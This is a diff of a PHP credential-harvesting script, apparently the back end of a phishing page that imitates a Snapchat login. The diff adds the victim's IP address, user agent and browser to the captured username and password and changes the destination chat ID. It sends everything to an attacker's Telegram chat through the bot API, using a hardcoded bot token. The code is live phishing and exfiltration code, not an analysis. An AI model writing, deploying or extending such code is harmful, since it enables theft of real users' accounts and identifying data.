@@ -15,9 +15,12 @@ $service = "Snapchat";
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
 $token = "5621562429:AAFI4GKbo3pJiG4JDA3AOAixKZXBW9NGEWM";
-$chat_id = "501357456";
+$chat_id = "972847950";
 $arr = array(
-
+  'Сервис: ' => $service,
+  'Айпи адресс: ' => $ipaddress,
+  'User Agent: ' => $useragent,
+  'Браузер: ' => $browser, 
   'Имя пользователя: ' => $username,
   'Пароль: ' => $password
 );
@@ -26,8 +29,6 @@ $txt = "";
 foreach($arr as $key => $value) {
   $txt .= "<b>".$key."</b> ".$value."%0A";
 };
-
-$txt = rawurlencode($txt);
 
 $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
 
